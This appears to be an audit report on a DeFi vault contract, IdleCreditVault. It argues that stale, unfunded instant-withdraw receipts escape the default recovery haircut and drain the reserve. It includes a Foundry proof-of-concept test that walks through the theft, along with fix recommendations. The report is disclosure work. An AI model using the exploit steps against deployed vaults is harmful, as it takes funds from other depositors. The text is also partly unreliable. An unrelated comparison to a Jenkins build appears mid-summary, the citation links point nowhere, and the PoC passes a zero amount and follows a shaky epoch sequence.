### Title
Unfunded instant-withdraw receipts from pre-default epochs escape the recovery haircut and drain the default recovery reserve - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`claimInstantWithdrawRequest` only routes default-epoch instant receipts through `_claimDefaultedInstantWithdrawRequest` (haircut via `defaultRecoveryPrice`). Any unfunded instant receipt recorded in an epoch *older* than `defaultRecoveryEpoch` falls through to the funded path, which burns the receipt and pays `instantWithdrawsRequests[_user]` at par via `_transferFundedClaim`. A stale (revoked-by-default) receipt is therefore "restarted" at full value, spending recovery reserve owed to defaulted-epoch claimants — the direct analog of restarting a Jenkins build whose script approval was revoked.

### Finding Description
- `requestInstantWithdraw` records `instantWithdrawsRequests[_user]`, `instantWithdrawsRequestsByEpoch[_user][epochNumber]`, and `pendingInstantWithdraws` without any epoch-maturity gate [1](#0-0) .
- If an epoch stops before `instantWithdrawDelay` elapses and the borrower never funds that epoch's instant bucket (`getInstantWithdrawFunds`/`collectInstantWithdrawFunds` never cover it), the request stays unfunded inside `pendingInstantWithdraws` while `epochNumber` advances.
- On `finalizeDefault`, `defaultRecoveryEpoch = epochNumber` and `defaultInstantWithdrawsFinalized = pendingInstantWithdraws != 0` [2](#0-1) . `_defaultPrefundedInstantReserve` computes prefunded reserve only from `instantWithdrawClaimsByEpoch[epochNumber]` (current epoch), so the older unfunded basis is not separately reserved.
- After finalization, `claimInstantWithdrawRequest` calls `_claimDefaultedInstantWithdrawRequest`, which clears *only* `instantWithdrawsRequestsByEpoch[_user][defaultRecoveryEpoch]` [3](#0-2) . The stale older-epoch receipt survives in `instantWithdrawsRequests[_user]` and is then paid 1:1 by `_transferFundedClaim` [4](#0-3) .
- Because the vault's non-reserve funded balance does not back this receipt (it was never funded), the par payment is sourced from tokens that belong to `defaultRecoveryReserve`, stealing from other defaulted claimants.

### Impact Explanation
An attacker holding an instant receipt from epoch `N-1` (unfunded) plus triggering default finalization in epoch `N` claims it at par while recovery is only `defaultRecoveryPrice` (e.g., 70%). The excess `(1 - recoveryPrice) * claimBasis` comes out of the recovery reserve, directly reducing what other defaulted-epoch and loss-adjusted claimants can withdraw — quantified theft of `claimBasis * (RECOVERY_FULL - defaultRecoveryPrice) / RECOVERY_FULL`, and last claimants' withdrawals revert on insufficient balance (permanent freezing of unclaimed yield).

### Likelihood Explanation
Requires: an instant-withdraw request whose funding round never completed (borrower underfunded or epoch stopped early), followed by borrower default and `finalizeDefault` — a realistic stressed-epoch sequence the default-recovery code paths are explicitly designed for. The attacker only needs to hold tranche tokens and time a normal user call; all privileged actors (manager, borrower, guardian) behave honestly per the threat model.

### Recommendation
In `claimInstantWithdrawRequest`, iterate/clear all unfunded instant receipts regardless of epoch: after `_claimDefaultedInstantWithdrawRequest`, subtract any remaining basis not backed by funded balance from `instantWithdrawsRequests[_user]` and pay it at `defaultRecoveryPrice` from the reserve, or track a per-user `fundedInstantBasis` so only actually-funded amounts reach `_transferFundedClaim` at par. Alternatively, store the funding epoch per receipt and haircut every epoch ≤ `defaultRecoveryEpoch` that was not fully funded.

```solidity
// SPDX-License-Identifier: MIT
// Fork PoC sketch (extend test/foundry/IdleCreditVault.t.sol harness, mainnet fork as in setUp)
function testStaleInstantReceiptEscapesDefaultHaircut() external {
    uint256 instantDelay = cdoEpoch.instantWithdrawDelay();
    vm.prank(manager);
    cdoEpoch.setInstantWithdrawParams(instantDelay, 1000, false);

    address attacker = makeAddr('stale-instant');
    uint256 amount = 10_000 * ONE_SCALE;
    _depositWithUser(attacker, amount, true);
    idleCDO.depositAA(amount); // honest LP for reserve comparison

    // Epoch 0 -> stop epoch; attacker requests instant withdraw in buffer
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr / 2, _expectedFundsEndEpoch());
    vm.prank(attacker);
    uint256 staleBasis = cdoEpoch.requestWithdraw(0, address(AAtranche)); // instant path

    // Epoch 1 starts; warp PAST epoch end WITHOUT calling getInstantWithdrawFunds
    // => staleBasis remains inside pendingInstantWithdraws, unfunded
    _startEpochAndCheckPrices(1);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0); // epochNumber advances; default path triggered by borrower non-repayment
    _checkDefault();

    // Manager finalizes default at recoveryRatio < 1, e.g. 70%
    uint256 recoveryRatio = 7e17;
    IdleCreditVault cv = IdleCreditVault(address(strategy));
    uint256 target = (cdoEpoch.getContractValue() + cdoEpoch.expectedEpochInterest()
        - cdoEpoch.pendingWithdrawFees() + cv.defaultPendingClaimBasis())
        * recoveryRatio / ONE_TRANCHE;
    deal(defaultUnderlying, manager, target);
    vm.startPrank(manager);
    IERC20Detailed(defaultUnderlying).approve(address(strategy), target);
    cdoEpoch.finalizeDefault(target, manager);
    vm.stopPrank();

    // Attacker claims: stale receipt pays at PAR instead of *recoveryRatio
    uint256 balPre = IERC20Detailed(defaultUnderlying).balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();
    uint256 paid = IERC20Detailed(defaultUnderlying).balanceOf(attacker) - balPre;

    // BUG: paid == staleBasis (par) instead of staleBasis * recoveryRatio / ONE_TRANCHE
    assertEq(paid, staleBasis, 'stale unfunded instant receipt paid at par');
    // Consequence: cv.defaultRecoveryReserve() drops below intended, later claimants revert
}
```
Expected correct behavior: `paid ≈ staleBasis * recoveryRatio / ONE_TRANCHE`. The par payout removes `(staleBasis * 3e17 / 1e18)` extra underlying from the reserve, provable by a second defaulted claimant's `claimWithdrawRequest` reverting on insufficient balance.

```text
  function requestInstantWithdraw(uint256 _amount, address _user) external {
    _onlyIdleCDO();
    _ensureDefaultRecoveryInitialized();
    // burn strategy tokens from cdo
    _burn(msg.sender, _amount);
  
    // mint equal amount of strategy tokens to the user as receipt, useful in case of default
    _mint(_user, _amount);

    // increase the instant withdraw requests for the user
    instantWithdrawsRequests[_user] += _amount;
    uint256 currentEpoch = epochNumber;
    // we record both per-user (old, kept for compatibility) and per-epoch so on
    // finalization we can distinguish "default-epoch pending instant receipts"
    // from old funded instant receipts.
    instantWithdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    instantWithdrawClaimsByEpoch[currentEpoch] += _amount;
    // increase the total instant withdraw requests
    pendingInstantWithdraws += _amount;
  }
```

```text
  function claimInstantWithdrawRequest(address _user) external {
    _onlyIdleCDO();
    if (defaultRecoveryFinalized && defaultInstantWithdrawsFinalized) {
      // Clear the defaulted-epoch instant receipt first, then continue so the same call can
      // also pay any older instant receipt that was already funded before default finalization.
      _claimDefaultedInstantWithdrawRequest(_user);
    }
    uint256 amount = instantWithdrawsRequests[_user];
    // burn strategy tokens from user
    _burn(_user, amount);

    instantWithdrawsRequests[_user] = 0;
    _transferFundedClaim(_user, amount);
  }
```

```text
  function _claimDefaultedInstantWithdrawRequest(address _user) internal returns (uint256 claimBasis) {
    uint256 defaultEpoch = defaultRecoveryEpoch;
    claimBasis = instantWithdrawsRequestsByEpoch[_user][defaultEpoch];
    if (claimBasis == 0) return claimBasis;

    instantWithdrawsRequestsByEpoch[_user][defaultEpoch] = 0;
    instantWithdrawsRequests[_user] -= claimBasis;
    uint256 pending = pendingInstantWithdraws;
    // `pendingInstantWithdraws` is only the unfunded remainder. If this user's claim is larger,
    // the extra amount was already counted as prefunded reserve during default finalization.
    pendingInstantWithdraws = claimBasis >= pending ? 0 : pending - claimBasis;
    instantWithdrawClaimsByEpoch[defaultEpoch] -= claimBasis;
    _burn(_user, claimBasis);
    _transferDefaultRecovery(_user, (claimBasis * defaultRecoveryPrice) / RECOVERY_FULL);
  }
```
